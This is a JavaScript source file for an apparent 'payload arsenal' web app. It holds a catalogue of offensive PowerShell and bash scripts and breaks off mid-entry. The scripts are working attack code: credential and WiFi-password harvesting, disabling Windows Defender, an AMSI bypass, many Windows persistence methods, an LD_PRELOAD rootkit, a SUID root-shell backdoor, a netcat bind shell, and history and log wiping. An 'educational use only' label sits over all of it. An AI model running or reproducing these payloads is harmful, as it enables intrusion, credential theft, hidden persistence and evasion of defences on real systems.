// ===== CYBERSECURITY PAYLOAD ARSENAL =====
// Advanced PowerShell & Shell Commands Collection
// Educational & Research Use Only

class CybersecurityArsenal {
    constructor() {
        this.version = '4.0.0';
        this.currentSection = 'basic';
        this.currentTheme = localStorage.getItem('theme') || 'dark';
        this.searchTerm = '';
        this.activeFilters = {
            complexity: ['basic', 'intermediate', 'advanced', 'expert'],
            platform: ['windows', 'linux', 'macos', 'cross_platform'],
            type: ['powershell', 'bash', 'cmd', 'python']
        };
        this.favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        this.payloadHistory = JSON.parse(localStorage.getItem('payloadHistory') || '[]');

        // Comprehensive Payload Database
        this.payloads = this.initializePayloads();
        this.init();
    }

    init() {
        try {
            this.showLoadingIndicator('Initializing application...');
            this.setupEventListeners();
            this.loadSection('basic');
            this.updateTheme();
            this.updateStats();
            this.initializeTabSwitching();
            this.hideLoadingIndicator();
            console.log('App initialized successfully');
        } catch (error) {
            console.error('App initialization failed:', error);
            this.hideLoadingIndicator();
            this.showNotification('Application failed to load. Please refresh the page.', 'error');
        }
    }

    initializePayloads() {
        return {
            // ===== BASIC SYSTEM INFORMATION =====
            system_info: {
                command: `# System Information Gathering
Write-Host "[*] System Information Collection" -ForegroundColor Cyan

# Basic System Info
Write-Host "System Name: $env:COMPUTERNAME" -ForegroundColor Green
Write-Host "User: $env:USERNAME" -ForegroundColor Green
Write-Host "Domain: $env:USERDOMAIN" -ForegroundColor Green
Write-Host "OS: $(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption)" -ForegroundColor Green

# Hardware Info
$cpu = Get-WmiObject Win32_Processor | Select-Object -ExpandProperty Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
Write-Host "CPU: $cpu" -ForegroundColor Yellow
Write-Host "RAM: $ram GB" -ForegroundColor Yellow

# Network Info
Get-NetIPConfiguration | Where-Object {$_.NetAdapter.Status -ne "Disconnected"} | ForEach-Object {
    Write-Host "Interface: $($_.InterfaceAlias)" -ForegroundColor Magenta
    Write-Host "IP: $($_.IPv4Address.IPAddress)" -ForegroundColor Magenta
}

# Running Processes
Write-Host "\`nTop 10 Processes by CPU:" -ForegroundColor Cyan
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Format-Table Name, Id, CPU -AutoSize`,
                description: "Comprehensive system information gathering including hardware, network, and process details.",
                complexity: "basic",
                platform: "windows",
                type: "powershell",
                category: "Reconnaissance",
                tags: ["recon", "system-info", "network", "processes"],
                mitre_id: "T1082"
            },

            network_scan: {
                command: `# Network Discovery
Write-Host "[*] Network Discovery Scan" -ForegroundColor Cyan

# Get network adapters
$adapters = Get-NetAdapter | Where-Object {$_.Status -eq "Up"}
foreach ($adapter in $adapters) {
    Write-Host "\`nAdapter: $($adapter.Name)" -ForegroundColor Green
    $config = Get-NetIPConfiguration -InterfaceIndex $adapter.InterfaceIndex
    Write-Host "IP: $($config.IPv4Address.IPAddress)" -ForegroundColor Yellow
    Write-Host "Gateway: $($config.IPv4DefaultGateway.NextHop)" -ForegroundColor Yellow
}

# ARP Table
Write-Host "\`nARP Table:" -ForegroundColor Cyan
Get-NetNeighbor | Where-Object {$_.State -ne "Unreachable"} | 
    Format-Table IPAddress, LinkLayerAddress, State -AutoSize

# Active connections
Write-Host "\`nActive Connections:" -ForegroundColor Cyan
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | 
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort | 
    Format-Table -AutoSize

# Listening ports
Write-Host "\`nListening Ports:" -ForegroundColor Cyan
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"} | 
    Sort-Object LocalPort | Format-Table LocalAddress, LocalPort, OwningProcess -AutoSize`,
                description: "Network discovery and scanning for active connections, ARP table, and listening services.",
                complexity: "intermediate",
                platform: "windows",
                type: "powershell",
                category: "Network Discovery",
                tags: ["network", "discovery", "scanning", "connections"],
                mitre_id: "T1018"
            },

            credential_dump: {
                command: `# Credential Harvesting
Write-Host "[*] Credential Harvesting (Authorized Testing Only)" -ForegroundColor Red

# Check for autologon credentials
$autologon = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -ErrorAction SilentlyContinue
if ($autologon.DefaultPassword) {
    Write-Host "AutoLogon Found!" -ForegroundColor Red
    Write-Host "Username: $($autologon.DefaultUserName)" -ForegroundColor Yellow
    Write-Host "Password: $($autologon.DefaultPassword)" -ForegroundColor Yellow
}

# Saved credentials
Write-Host "\`nSaved Credentials:" -ForegroundColor Green
cmdkey /list

# WiFi passwords
Write-Host "\`nWiFi Passwords:" -ForegroundColor Green
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ':')[1].Trim()}
foreach ($profile in $profiles) {
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
    if ($password) {
        Write-Host "Network: $profile" -ForegroundColor Yellow
        Write-Host "Password: $($password -split ':')[1].Trim()" -ForegroundColor Red
    }
}

# Browser credential locations
Write-Host "\`nBrowser Credential Locations:" -ForegroundColor Green
$locations = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
    "$env:APPDATA\\Mozilla\\Firefox\\Profiles",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
)
foreach ($location in $locations) {
    if (Test-Path $location) {
        Write-Host "Found: $location" -ForegroundColor Yellow
    }
}

Write-Host "\`n[WARNING] This is for authorized testing only!" -ForegroundColor Red`,
                description: "Credential harvesting techniques for extracting stored passwords and authentication data.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Credential Access",
                tags: ["credentials", "passwords", "wifi", "browser"],
                mitre_id: "T1003"
            },

            privilege_escalation: {
                command: `# Privilege Escalation Check
Write-Host "[*] Privilege Escalation Enumeration" -ForegroundColor Cyan

# Current privileges
Write-Host "Current User:" -ForegroundColor Green
whoami /all

# Check if admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
Write-Host "Running as Admin: $isAdmin" -ForegroundColor $(if($isAdmin){"Green"}else{"Red"})

# Unquoted service paths
Write-Host "\`nUnquoted Service Paths:" -ForegroundColor Yellow
Get-WmiObject -Class Win32_Service | Where-Object { 
    $_.PathName -and 
    $_.PathName -notmatch '^".*"$' -and 
    $_.PathName -match ' ' 
} | Select-Object Name, DisplayName, PathName | Format-Table -AutoSize

# AlwaysInstallElevated
Write-Host "\`nChecking AlwaysInstallElevated:" -ForegroundColor Yellow
$hklm = Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$hkcu = Get-ItemProperty HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    Write-Host "AlwaysInstallElevated is ENABLED!" -ForegroundColor Red
}

# Scheduled tasks
Write-Host "\`nScheduled Tasks (SYSTEM):" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | 
    Select-Object TaskName, State | Format-Table -AutoSize

# Services with interesting permissions
Write-Host "\`nServices with custom paths:" -ForegroundColor Yellow
Get-WmiObject win32_service | Where-Object {$_.PathName -notmatch "C:\\\\Windows"} | 
    Select-Object Name, DisplayName, PathName, StartMode | Format-Table -AutoSize`,
                description: "Comprehensive privilege escalation enumeration identifying potential attack vectors and misconfigurations.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Privilege Escalation",
                tags: ["privilege-escalation", "services", "registry"],
                mitre_id: "T1068"
            },

            persistence_registry: {
                command: `# Registry Persistence
Write-Host "[*] Registry Persistence Mechanisms" -ForegroundColor Cyan

# Common persistence locations
$locations = @(
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
)

Write-Host "Current Persistence Entries:" -ForegroundColor Green
foreach ($location in $locations) {
    try {
        $entries = Get-ItemProperty -Path $location -ErrorAction SilentlyContinue
        if ($entries) {
            Write-Host "\`nLocation: $location" -ForegroundColor Yellow
            $entries.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
                Write-Host "  $($_.Name): $($_.Value)" -ForegroundColor White
            }
        }
    } catch {
        Write-Host "Cannot access: $location" -ForegroundColor Red
    }
}

# Example persistence methods
Write-Host "\`nPersistence Implementation Examples:" -ForegroundColor Cyan

Write-Host "\`n# Add to HKLM Run (requires admin):" -ForegroundColor Yellow
Write-Host 'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SecurityUpdate" -Value "C:\\Windows\\System32\\calc.exe"' -ForegroundColor Green

Write-Host "\`n# Add to HKCU Run (current user):" -ForegroundColor Yellow
Write-Host 'New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "UserUpdate" -Value "C:\\Windows\\System32\\notepad.exe"' -ForegroundColor Green

Write-Host "\`n# Scheduled Task:" -ForegroundColor Yellow
Write-Host '$action = New-ScheduledTaskAction -Execute "notepad.exe"' -ForegroundColor Green
Write-Host '$trigger = New-ScheduledTaskTrigger -AtLogOn' -ForegroundColor Green
Write-Host 'Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger' -ForegroundColor Green

Write-Host "\`n[WARNING] Use only for authorized testing!" -ForegroundColor Red`,
                description: "Registry-based persistence mechanisms for maintaining access across system reboots.",
                complexity: "intermediate",
                platform: "windows",
                type: "powershell",
                category: "Persistence",
                tags: ["persistence", "registry", "startup", "scheduled-tasks"],
                mitre_id: "T1547.001"
            },

            linux_enumeration: {
                command: `#!/bin/bash
# Linux System Enumeration
echo -e "\\033[1;32m[*] Linux System Enumeration\\033[0m"

# Basic system info
echo -e "\\n\\033[1;34m[+] System Information:\\033[0m"
echo "Hostname: $(hostname)"
echo "Kernel: $(uname -a)"
echo "Distribution: $(cat /etc/*release 2>/dev/null | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '\\"')"
echo "Uptime: $(uptime)"

# Current user
echo -e "\\n\\033[1;34m[+] Current User:\\033[0m"
echo "User: $(whoami)"
echo "Groups: $(groups)"
echo "UID/GID: $(id)"

# Sudo privileges  
echo -e "\\n\\033[1;34m[+] Sudo Privileges:\\033[0m"
sudo -l 2>/dev/null || echo "Cannot check sudo privileges"

# SUID binaries
echo -e "\\n\\033[1;34m[+] SUID Binaries:\\033[0m"
find / -type f -perm -4000 2>/dev/null | head -20

# Network info
echo -e "\\n\\033[1;34m[+] Network Configuration:\\033[0m"
ip addr show 2>/dev/null || ifconfig 2>/dev/null

# Active connections
echo -e "\\n\\033[1;34m[+] Active Connections:\\033[0m"
netstat -tulpn 2>/dev/null | grep LISTEN

# Running processes
echo -e "\\n\\033[1;34m[+] Running Processes:\\033[0m"
ps aux --sort=-%cpu | head -10

# Cron jobs
echo -e "\\n\\033[1;34m[+] Cron Jobs:\\033[0m"
cat /etc/crontab 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# World writable directories
echo -e "\\n\\033[1;34m[+] World Writable Directories:\\033[0m"
find / -type d -perm -002 2>/dev/null | grep -v proc | head -10

echo -e "\\n\\033[1;32m[*] Enumeration Complete\\033[0m"`,
                description: "Comprehensive Linux system enumeration for gathering system information and identifying potential attack vectors.",
                complexity: "intermediate",
                platform: "linux",
                type: "bash",
                category: "Reconnaissance",
                tags: ["linux", "enumeration", "suid", "network"],
                mitre_id: "T1082"
            },

            advanced_windows_evasion: {
                command: `# Advanced Windows Defense Evasion
Write-Host "[*] Advanced Defense Evasion Techniques" -ForegroundColor Red

# Disable Windows Defender Real-time Protection
Write-Host "\\n[+] Attempting to disable Windows Defender..." -ForegroundColor Yellow
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    Write-Host "Defender Real-time Protection Disabled" -ForegroundColor Green
} catch {
    Write-Host "Failed to disable Defender: $_" -ForegroundColor Red
}

# Bypass AMSI (AntiMalware Scan Interface)
Write-Host "\\n[+] AMSI Bypass Attempt..." -ForegroundColor Yellow
$a = 'System.Management.Automation.A' + 'msiUtils'
$b = [Ref].Assembly.GetType($a)
$c = $b.GetField('amsiInitFailed','NonPublic,Static')
$c.SetValue($null,$true)
Write-Host "AMSI Context Modified" -ForegroundColor Green

# Process Hollowing Preparation
Write-Host "\\n[+] Process Hollowing Setup..." -ForegroundColor Yellow
$ProcessHollow = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ProcessHollow {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
}
"@

# Compile and load the class
try {
    Add-Type -TypeDefinition $ProcessHollow -Language CSharp
    Write-Host "Process Hollowing Functions Loaded" -ForegroundColor Green
} catch {
    Write-Host "Failed to load process functions" -ForegroundColor Red
}

# Registry Persistence with Obfuscation
Write-Host "\\n[+] Advanced Registry Persistence..." -ForegroundColor Yellow
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Start-Process calc.exe"))
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$regName = "SecurityUpdate" + (Get-Random -Maximum 9999)

try {
    New-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedCommand" -Force
    Write-Host "Registry Persistence Established: $regName" -ForegroundColor Green
} catch {
    Write-Host "Registry modification failed" -ForegroundColor Red
}

# Token Manipulation
Write-Host "\\n[+] Token Manipulation..." -ForegroundColor Yellow
$TokenManip = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class TokenManipulation {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
}
"@

try {
    Add-Type -TypeDefinition $TokenManip -Language CSharp
    Write-Host "Token Manipulation Functions Ready" -ForegroundColor Green
} catch {
    Write-Host "Token functions load failed" -ForegroundColor Red
}

Write-Host "\\n[*] Advanced Evasion Setup Complete" -ForegroundColor Red
Write-Host "[WARNING] Use only in authorized environments!" -ForegroundColor Yellow`,
                description: "Advanced Windows defense evasion including AMSI bypass, process hollowing, and token manipulation.",
                complexity: "expert",
                platform: "windows",
                type: "powershell",
                category: "Defense Evasion",
                tags: ["amsi-bypass", "process-hollowing", "token-manipulation", "defender-bypass"],
                mitre_id: "T1055"
            },

            linux_privilege_escalation: {
                command: `#!/bin/bash
# Advanced Linux Privilege Escalation
echo -e "\\033[1;31m[*] Advanced Linux Privilege Escalation\\033[0m"

# Kernel Exploits Check
echo -e "\\n\\033[1;34m[+] Kernel Exploit Detection:\\033[0m"
kernel_version=$(uname -r)
echo "Kernel Version: $kernel_version"

# Check for known vulnerable kernels
if [[ "$kernel_version" =~ ^3\\.13\\. ]]; then
    echo -e "\\033[1;31m[!] Potentially vulnerable to CVE-2014-0038 (recvmmsg)\\033[0m"
fi

if [[ "$kernel_version" =~ ^4\\.[4-5]\\. ]]; then
    echo -e "\\033[1;31m[!] Potentially vulnerable to CVE-2017-16995 (eBPF)\\033[0m"
fi

# Advanced SUID/SGID Enumeration
echo -e "\\n\\033[1;34m[+] Advanced SUID/SGID Analysis:\\033[0m"
find / \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null | while read file; do
    if command -v "$file" &> /dev/null; then
        echo -e "\\033[1;33m[+] Binary: $file\\033[0m"
        # Check if binary has known escalation methods
        case "$(basename "$file")" in
            "nmap"|"vim"|"nano"|"less"|"more"|"man"|"awk"|"find"|"xargs")
                echo -e "\\033[1;31m    [!] Potential GTFOBins escalation vector\\033[0m"
                ;;
        esac
    fi
done

# Capability Enumeration
echo -e "\\n\\033[1;34m[+] File Capabilities:\\033[0m"
getcap -r / 2>/dev/null | head -20

# Docker Escape Check
echo -e "\\n\\033[1;34m[+] Container Escape Vectors:\\033[0m"
if [ -f /.dockerenv ]; then
    echo -e "\\033[1;31m[!] Running in Docker container\\033[0m"
    
    # Check for privileged container
    if [ -c /dev/kmsg ]; then
        echo -e "\\033[1;31m[!] Privileged container detected\\033[0m"
    fi
    
    # Check for docker socket
    if [ -S /var/run/docker.sock ]; then
        echo -e "\\033[1;31m[!] Docker socket accessible\\033[0m"
    fi
fi

# Advanced Cron Job Analysis
echo -e "\\n\\033[1;34m[+] Advanced Cron Analysis:\\033[0m"
for cron_dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly; do
    if [ -d "$cron_dir" ]; then
        echo "Checking $cron_dir:"
        ls -la "$cron_dir" 2>/dev/null | grep -v total
    fi
done

# Writable Service Files
echo -e "\\n\\033[1;34m[+] Writable Service Files:\\033[0m"
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null

# Environment Variable Hijacking
echo -e "\\n\\033[1;34m[+] Environment Hijacking Opportunities:\\033[0m"
echo "PATH: $PATH"
echo "LD_PRELOAD: $LD_PRELOAD"
echo "LD_LIBRARY_PATH: $LD_LIBRARY_PATH"

# Check for writable directories in PATH
IFS=':' read -ra ADDR <<< "$PATH"
for dir in "${ADDR[@]}"; do
    if [ -w "$dir" ]; then
        echo -e "\\033[1;31m[!] Writable PATH directory: $dir\\033[0m"
    fi
done

# Memory Analysis
echo -e "\\n\\033[1;34m[+] Memory Protection Analysis:\\033[0m"
cat /proc/sys/kernel/randomize_va_space 2>/dev/null && echo " (ASLR Status)"
cat /proc/sys/kernel/exec-shield 2>/dev/null && echo " (ExecShield Status)"

# Advanced File Permission Analysis
echo -e "\\n\\033[1;34m[+] Advanced Permission Analysis:\\033[0m"
find / -type f \\( -name "*.conf" -o -name "*.config" -o -name "*.cfg" \\) -readable 2>/dev/null | head -10

echo -e "\\n\\033[1;32m[*] Privilege Escalation Analysis Complete\\033[0m"`,
                description: "Advanced Linux privilege escalation enumeration including kernel exploits, container escapes, and capability analysis.",
                complexity: "expert",
                platform: "linux",
                type: "bash",
                category: "Privilege Escalation",
                tags: ["kernel-exploits", "container-escape", "capabilities", "suid-analysis"],
                mitre_id: "T1068"
            },

            windows_persistence_advanced: {
                command: `# Advanced Windows Persistence Mechanisms
Write-Host "[*] Advanced Persistence Implementation" -ForegroundColor Cyan

# WMI Event Subscription Persistence
Write-Host "\\n[+] WMI Event Subscription Persistence..." -ForegroundColor Yellow
$filterName = "SecurityFilter" + (Get-Random -Maximum 9999)
$consumerName = "SecurityConsumer" + (Get-Random -Maximum 9999)

# Create WMI Event Filter
$filterArgs = @{
    Name = $filterName
    EventNameSpace = 'root\\cimv2'
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
}

try {
    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments $filterArgs
    Write-Host "WMI Filter Created: $filterName" -ForegroundColor Green
} catch {
    Write-Host "WMI Filter creation failed" -ForegroundColor Red
}

# Create WMI Event Consumer
$consumerArgs = @{
    Name = $consumerName
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command \\"Start-Process calc.exe\\""
}

try {
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $consumerArgs
    Write-Host "WMI Consumer Created: $consumerName" -ForegroundColor Green
} catch {
    Write-Host "WMI Consumer creation failed" -ForegroundColor Red
}

# Service Persistence with Binary Path Modification
Write-Host "\\n[+] Service Persistence Implementation..." -ForegroundColor Yellow
$serviceName = "SecurityService" + (Get-Random -Maximum 9999)
$binaryPath = "C:\\Windows\\System32\\calc.exe"

try {
    New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName "Security Update Service" -StartupType Automatic
    Write-Host "Malicious Service Created: $serviceName" -ForegroundColor Green
} catch {
    Write-Host "Service creation failed" -ForegroundColor Red
}

# COM Hijacking Persistence
Write-Host "\\n[+] COM Object Hijacking..." -ForegroundColor Yellow
$clsid = "{" + [System.Guid]::NewGuid().ToString() + "}"
$comPath = "HKCU:\\Software\\Classes\\CLSID\\$clsid\\InprocServer32"

try {
    New-Item -Path $comPath -Force | Out-Null
    Set-ItemProperty -Path $comPath -Name "(Default)" -Value "C:\\Windows\\System32\\calc.exe"
    Write-Host "COM Hijack Registered: $clsid" -ForegroundColor Green
} catch {
    Write-Host "COM registration failed" -ForegroundColor Red
}

# Startup Folder Persistence
Write-Host "\\n[+] Startup Folder Persistence..." -ForegroundColor Yellow
$startupPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\security.bat"
$batchContent = @"
@echo off
start /b powershell.exe -WindowStyle Hidden -Command "Start-Process calc.exe"
exit
"@

try {
    $batchContent | Out-File -FilePath $startupPath -Encoding ASCII
    Write-Host "Startup persistence established: $startupPath" -ForegroundColor Green
} catch {
    Write-Host "Startup persistence failed" -ForegroundColor Red
}

# Logon Script Persistence
Write-Host "\\n[+] Logon Script Persistence..." -ForegroundColor Yellow
$logonScript = "HKCU:\\Environment"
$scriptCommand = "powershell.exe -WindowStyle Hidden -Command \\"Start-Process calc.exe\\""

try {
    Set-ItemProperty -Path $logonScript -Name "UserInitMprLogonScript" -Value $scriptCommand
    Write-Host "Logon script persistence established" -ForegroundColor Green
} catch {
    Write-Host "Logon script persistence failed" -ForegroundColor Red
}

# Image File Execution Options (IFEO) Persistence
Write-Host "\\n[+] IFEO Debugger Persistence..." -ForegroundColor Yellow
$targetBinary = "notepad.exe"
$ifeoPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$targetBinary"

try {
    if (!(Test-Path $ifeoPath)) {
        New-Item -Path $ifeoPath -Force | Out-Null
    }
    Set-ItemProperty -Path $ifeoPath -Name "Debugger" -Value "calc.exe"
    Write-Host "IFEO Debugger set for $targetBinary" -ForegroundColor Green
} catch {
    Write-Host "IFEO persistence failed (requires admin)" -ForegroundColor Red
}

# PowerShell Profile Persistence
Write-Host "\\n[+] PowerShell Profile Persistence..." -ForegroundColor Yellow
$profilePath = $PROFILE.AllUsersAllHosts

try {
    $maliciousProfile = 'Start-Process calc.exe -WindowStyle Hidden'
    if (Test-Path $profilePath) {
        Add-Content -Path $profilePath -Value "\\n$maliciousProfile"
    } else {
        New-Item -Path $profilePath -ItemType File -Force | Out-Null
        Set-Content -Path $profilePath -Value $maliciousProfile
    }
    Write-Host "PowerShell profile modified: $profilePath" -ForegroundColor Green
} catch {
    Write-Host "Profile persistence failed" -ForegroundColor Red
}

Write-Host "\\n[*] Advanced Persistence Implementation Complete" -ForegroundColor Cyan
Write-Host "[WARNING] Multiple persistence mechanisms deployed!" -ForegroundColor Red`,
                description: "Advanced Windows persistence techniques including WMI events, COM hijacking, and service manipulation.",
                complexity: "expert",
                platform: "windows",
                type: "powershell",
                category: "Persistence",
                tags: ["wmi-persistence", "com-hijacking", "service-persistence", "ifeo"],
                mitre_id: "T1546"
            },

            linux_rootkit_techniques: {
                command: `#!/bin/bash
# Advanced Linux Rootkit Techniques
echo -e "\\033[1;31m[*] Advanced Rootkit Implementation Techniques\\033[0m"

# LD_PRELOAD Rootkit
echo -e "\\n\\033[1;34m[+] LD_PRELOAD Rootkit Implementation:\\033[0m"
cat << 'EOF' > /tmp/rootkit.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static int (*old_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dir) {
    if (old_readdir == NULL) {
        old_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent *result = old_readdir(dir);
    
    if (result != NULL && strstr(result->d_name, "rootkit") != NULL) {
        return readdir(dir);
    }
    
    return result;
}
EOF

echo -e "\\033[1;33m[+] Rootkit source created at /tmp/rootkit.c\\033[0m"

# Compile the rootkit
if command -v gcc &> /dev/null; then
    gcc -shared -fPIC /tmp/rootkit.c -o /tmp/rootkit.so -ldl 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "\\033[1;32m[+] Rootkit compiled successfully\\033[0m"
        echo -e "\\033[1;33m    Usage: LD_PRELOAD=/tmp/rootkit.so ls\\033[0m"
    else
        echo -e "\\033[1;31m[-] Compilation failed\\033[0m"
    fi
else
    echo -e "\\033[1;31m[-] GCC not available\\033[0m"
fi

# Kernel Module Information
echo -e "\\n\\033[1;34m[+] Kernel Module Rootkit Framework:\\033[0m"
cat << 'EOF' > /tmp/kmod_rootkit.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Educational Rootkit Module");

static unsigned long *sys_call_table;

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit module loaded\\n");
    // System call table manipulation would go here
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit module unloaded\\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
EOF

echo -e "\\033[1;33m[+] Kernel module source created at /tmp/kmod_rootkit.c\\033[0m"

# Process Hiding Techniques
echo -e "\\n\\033[1;34m[+] Process Hiding Techniques:\\033[0m"

# Create a hidden process name
hidden_proc_name="[kworker/0:1]"
echo -e "\\033[1;33m[+] Mimicking kernel thread name: $hidden_proc_name\\033[0m"

# File Hiding with Attribute Manipulation
echo -e "\\n\\033[1;34m[+] File Hiding Techniques:\\033[0m"

# Create hidden directory with special characters
hidden_dir="/tmp/.hidden$(printf '\\x00')space"
mkdir -p "$hidden_dir" 2>/dev/null
echo -e "\\033[1;33m[+] Hidden directory created (null byte): $hidden_dir\\033[0m"

# SUID Backdoor Installation
echo -e "\\n\\033[1;34m[+] SUID Backdoor Implementation:\\033[0m"
cat << 'EOF' > /tmp/backdoor.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

echo -e "\\033[1;33m[+] SUID backdoor source created\\033[0m"

if command -v gcc &> /dev/null; then
    gcc /tmp/backdoor.c -o /tmp/backdoor 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "\\033[1;32m[+] Backdoor compiled\\033[0m"
        echo -e "\\033[1;33m    To activate: chmod +s /tmp/backdoor (requires root)\\033[0m"
    fi
fi

# Network Backdoor
echo -e "\\n\\033[1;34m[+] Network Backdoor Implementation:\\033[0m"
cat << 'EOF' > /tmp/netbackdoor.sh
#!/bin/bash
# Simple network backdoor
while true; do
    nc -nlvp 4444 -e /bin/bash 2>/dev/null
    sleep 5
done &
EOF

chmod +x /tmp/netbackdoor.sh
echo -e "\\033[1;33m[+] Network backdoor created at /tmp/netbackdoor.sh\\033[0m"

# Log Evasion Techniques
echo -e "\\n\\033[1;34m[+] Log Evasion Setup:\\033[0m"

# Clear bash history
echo -e "\\033[1;33m[+] History clearing commands:\\033[0m"
echo "    unset HISTFILE"
echo "    export HISTFILESIZE=0"
echo "    history -c"
echo "    rm ~/.bash_history"

# Timestamp manipulation
echo -e "\\033[1;33m[+] Timestamp manipulation:\\033[0m"
echo "    touch -r /etc/passwd malicious_file"
echo "    touch -t 202301010000 malicious_file"

# Anti-forensics
echo -e "\\n\\033[1;34m[+] Anti-Forensics Techniques:\\033[0m"
echo -e "\\033[1;33m[+] Secure deletion:\\033[0m"
echo "    shred -vfz -n 3 filename"
echo "    dd if=/dev/urandom of=filename bs=1024 count=filesize"

echo -e "\\n\\033[1;33m[+] Memory dumping prevention:\\033[0m"
echo "    echo 2 > /proc/sys/kernel/yama/ptrace_scope"

# Persistence via cron
echo -e "\\n\\033[1;34m[+] Cron Persistence:\\033[0m"
cron_entry="*/5 * * * * /tmp/netbackdoor.sh"
echo -e "\\033[1;33m[+] Cron entry example: $cron_entry\\033[0m"

echo -e "\\n\\033[1;31m[*] Rootkit Implementation Guide Complete\\033[0m"
echo -e "\\033[1;33m[WARNING] All techniques for educational/authorized testing only!\\033[0m"`,
                description: "Advanced Linux rootkit techniques including LD_PRELOAD hooks, kernel modules, and anti-forensics.",
                complexity: "expert",
                platform: "linux",
                type: "bash",
                category: "Defense Evasion",
                tags: ["rootkit", "ld-preload", "kernel-module", "anti-forensics"],
                mitre_id: "T1014"
            },

            windows_lateral_movement: {
                command: `# Advanced Windows Lateral Movement
